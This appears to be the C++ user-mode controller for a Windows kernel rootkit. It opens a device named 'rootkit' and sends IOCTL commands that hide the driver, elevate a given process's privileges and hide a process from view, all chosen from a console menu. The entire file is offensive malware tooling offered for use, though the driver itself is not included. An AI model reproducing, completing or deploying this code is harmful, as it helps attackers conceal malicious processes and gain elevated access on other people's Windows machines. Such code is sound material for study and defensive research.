#include <iostream>
#include <Windows.h>

namespace Rootkit {
    namespace codes {
        // CTL Codes to communicate with User Mode application.
        constexpr ULONG HideDriver =
            CTL_CODE(FILE_DEVICE_UNKNOWN, 0x696, METHOD_BUFFERED, FILE_SPECIAL_ACCESS);
        constexpr ULONG ElevateProcess =
            CTL_CODE(FILE_DEVICE_UNKNOWN, 0x697, METHOD_BUFFERED, FILE_SPECIAL_ACCESS);
        constexpr ULONG HideProcess =
            CTL_CODE(FILE_DEVICE_UNKNOWN, 0x698, METHOD_BUFFERED, FILE_SPECIAL_ACCESS);
    }
    struct Request {
        HANDLE process_id;
    };


    bool HideTheDriver(HANDLE driver_handle) {
        DWORD bytes_returned = 0;
        // Properly declare all parameters for DeviceIoControl
        return DeviceIoControl(
            driver_handle,                // Handle to device
            codes::HideDriver,            // Control code
            nullptr,                      // Input buffer
            0,                           // Input buffer size
            nullptr,                      // Output buffer
            0,                           // Output buffer size
            &bytes_returned,             // Bytes returned
            nullptr                      // Overlapped
        );
      
    }

    bool ElevateProcess(HANDLE driver_handle, DWORD pid) {
        Request r;
        r.process_id = ULongToHandle(pid);


        return DeviceIoControl(
            driver_handle,
            codes::ElevateProcess,
            &r,
            sizeof(r),
            &r,
            sizeof(r),
            nullptr,
            nullptr
        );
    }

    bool HideProcess(HANDLE driver_handle, DWORD pid) {
        // Use our structure
        Request r;
        // Convert the DWORD to a HANDLE
        r.process_id = ULongToHandle(pid);
        // Send.
        return DeviceIoControl(
            driver_handle,
            codes::HideProcess,
            &r,
            sizeof(r),
            &r,
            sizeof(r),
            nullptr,
            nullptr
        );
    }
}

void showMenu() {
    std::cout << "===== User Mode Menu =====\n";
    std::cout << "1. Hide Driver\n";
    std::cout << "2. Elevate Process\n";
    std::cout << "3. Hide Process\n";
    std::cout << "99. Exit\n";
    std::cout << "=======================\n";
    std::cout << "Enter your choice: ";
}

int main() {
    std::cout << "Starting user mode program...\n";

    // Request more comprehensive access rights
    const HANDLE driver_handle = CreateFile(
        L"\\\\.\\rootkit",                    // Device name
        GENERIC_READ | GENERIC_WRITE,         // Desired access
        FILE_SHARE_READ | FILE_SHARE_WRITE,   // Share mode
        nullptr,                              // Security attributes
        OPEN_EXISTING,                        // Creation disposition
        FILE_ATTRIBUTE_NORMAL,                // Flags and attributes
        nullptr                               // Template file
    );

    if (driver_handle == INVALID_HANDLE_VALUE) {
        DWORD error = GetLastError();
        std::cout << "Failed to create driver handle. Error code: " << error << std::endl;
        switch (error) {
        case ERROR_ACCESS_DENIED:
            std::cout << "Access denied. Try running as Administrator.\n";
            break;
        case ERROR_FILE_NOT_FOUND:
            std::cout << "Driver device not found. Ensure driver is loaded. (Try to run as admin anyway, worked for me the last time.)\n";
            break;
        default:
            std::cout << "Unknown error occurred.\n";
        }
        return 1;
    }

    std::cout << "Got a driver handle!\n";

    int choice;

    while (true) {
        showMenu();

        std::cin >> choice;

        switch (choice) {
        case 1:
            std::cout << "[!] Sending Message to Driver.\n";
            Rootkit::HideTheDriver(driver_handle);
            break;

        case 2:
            int pid;
            std::cout << "Enter a PID: ";
            std::cin >> pid;
            std::cout << "[!] Sending Message to Driver.\n";
            Rootkit::ElevateProcess(driver_handle, pid);
            break;
        case 3:
            int pidHide;
            std::cout << "Enter a PID: ";
            std::cin >> pidHide;
            std::cout << "[!] Sending Message to Driver.\n";
            Rootkit::HideProcess(driver_handle, pidHide);
            break;
        case 99:
            std::cout << "Exiting the program, bye!\n";
            break;
        default:
            std::cout << "Invalid Choice.\n";
        }
        CloseHandle(driver_handle);
        std::cout << "Ended\n";
        return 0;
    }
}